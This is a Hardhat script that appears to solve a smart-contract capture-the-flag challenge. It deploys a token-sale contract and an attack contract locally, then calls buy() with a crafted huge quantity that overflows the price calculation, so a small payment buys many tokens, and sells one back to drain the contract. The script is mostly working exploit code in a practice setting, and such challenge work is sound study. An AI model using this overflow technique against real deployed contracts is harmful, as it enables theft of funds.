const {ethers} = require("hardhat");
const hre = require("hardhat");

async function main() {
    const  [deployer, player]  = await ethers.getSigners();
    const baseContractFactory = await hre.ethers.getContractFactory('TokenSaleChallenge', deployer);
    const attackBaseContractFactory = await hre.ethers.getContractFactory('AttackTokenSales', deployer);
    const payment = hre.ethers.utils.parseEther('1');
    const provider = hre.ethers.provider;
    const contract = await baseContractFactory.deploy(player.address, {value: payment});
    const attackContract = await attackBaseContractFactory.deploy(contract.address);
    // const telephoneContract = await hre.ethers.getContractAt('Telephone', "0xC6bA8C3233eCF65B761049ef63466945c362EdD2");
    //
    await contract.deployed();
    await attackContract.deployed();

    await attackContract.attack();
    // await attackContract.attack({value: payment});
    await contract.buy(ethers.BigNumber.from("115792089237316195423570985008687907853269984665640564039458"), {value: ethers.BigNumber.from("415992086870360064")});
    await contract.sell(1);
    // await contract.sell(3);
    console.log(await contract.isComplete());

}

main();